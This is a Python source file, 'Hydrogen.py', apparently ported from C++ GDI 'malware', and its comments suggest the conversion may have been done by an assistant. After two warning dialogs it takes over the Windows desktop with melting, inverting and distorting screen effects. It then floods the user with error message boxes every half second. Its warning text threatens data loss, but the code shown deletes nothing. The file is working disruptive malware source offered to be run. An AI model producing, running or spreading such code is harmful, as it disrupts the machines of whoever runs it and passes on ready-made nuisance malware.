import ctypes
import threading
import time
import math
import random
from ctypes import wintypes

# DLL Loads
user32 = ctypes.windll.user32
gdi32 = ctypes.windll.gdi32
kernel32 = ctypes.windll.kernel32

# Constants
SRCCOPY = 0x00CC0020
SRCINVERT = 0x00660046
PATINVERT = 0x005A0049
NOTSRCCOPY = 0x00330008
SW = user32.GetSystemMetrics(0)
SH = user32.GetSystemMetrics(1)

# --- Initialization ---

def init_dpi():
    try:
        # High DPI awareness prevents scaling issues
        ctypes.windll.shcore.SetProcessDpiAwareness(1)
    except Exception:
        user32.SetProcessDPIAware()

def messagebox_warnings():
    # Warning 1
    res = user32.MessageBoxW(0, 
        "What you have just executed is a malware.\nYou might lose all of your data if you continue!\nStill execute it?", 
        "Hydrogen.py", 0x00000004 | 0x00000030 | 0x00040000)
    if res != 6: # IDYES
        exit()

    # Warning 2
    res = user32.MessageBoxW(0, 
        "THIS IS THE LAST WARNING!\nTHE CREATOR WILL NOT BE RESPONSIBLE FOR ANY DESTRUCTION!\nSTILL CONTINUE?", 
        "Hydrogen.py - LAST WARNING", 0x00000004 | 0x00000030 | 0x00040000)
    if res != 6:
        exit()

# --- Example Payload Functions ---
# Since the C++ file used a header 'payloads.h', I've implemented 
# common 'Hydrogen' style effects here.

def payload_1(stop_event):
    """Screen melting effect"""
    while not stop_event.is_set():
        hdc = user32.GetDC(0)
        x = random.randint(0, SW)
        y = random.randint(0, 5)
        gdi32.BitBlt(hdc, x, y, 100, SH, hdc, x, 0, SRCCOPY)
        user32.ReleaseDC(0, hdc)
        time.sleep(0.01)

def payload_2(stop_event):
    """Inverting boxes"""
    while not stop_event.is_set():
        hdc = user32.GetDC(0)
        gdi32.BitBlt(hdc, random.randint(0, SW), random.randint(0, SH), 
                     random.randint(0, 200), random.randint(0, 200), 
                     hdc, 0, 0, NOTSRCCOPY)
        user32.ReleaseDC(0, hdc)
        time.sleep(0.1)

def payload_3(stop_event):
    """Slowing bouncing screen"""
    while not stop_event.is_set():
        hdc = user32.GetDC(0)
        gdi32.BitBlt(hdc, 2, 2, SW, SH, hdc, 0, 0, SRCCOPY)
        user32.ReleaseDC(0, hdc)
        time.sleep(0.01)

def shader_style_1(stop_event):
    """Basic Sinewave Shader"""
    angle = 0
    while not stop_event.is_set():
        hdc = user32.GetDC(0)
        for i in range(0, SH, 2):
            offset = int(math.sin(angle + i/20) * 10)
            gdi32.BitBlt(hdc, offset, i, SW, 2, hdc, 0, i, SRCCOPY)
        angle += 0.1
        user32.ReleaseDC(0, hdc)
        time.sleep(0.01)

# --- Logic Controllers ---

def execute_payload(func, duration):
    """Helper to run a payload for a set time, then clear it"""
    stop_event = threading.Event()
    thread = threading.Thread(target=func, args=(stop_event,), daemon=True)
    thread.start()
    time.sleep(duration)
    stop_event.set()
    # Force a screen refresh to clear the effect
    user32.InvalidateRect(0, 0, 0)
    time.sleep(0.1)

def message_box_payload():
    """Final chaos stage"""
    while True:
        threading.Thread(target=lambda: user32.MessageBoxW(0, "Hydrogen?", "Error", 0x10)).start()
        time.sleep(0.5)

# --- Main Execution ---

def main():
    messagebox_warnings()
    init_dpi()

    # The original script uses PAYLOAD_TIME. We'll set it to 10 seconds.
    PAYLOAD_TIME = 10

    # Start Timer/Audio (Simulated)
    print("Executing GDI Payloads...")

    # Execute Payloads sequentially
    payload_list = [payload_1, payload_2, payload_3, shader_style_1]
    
    for p in payload_list:
        execute_payload(p, PAYLOAD_TIME)

    # Final stage
    t_msg = threading.Thread(target=message_box_payload, daemon=True)
    t_msg.start()
    
    print("Sequence Finished.")
    time.sleep(10)

if __name__ == "__main__":
    main()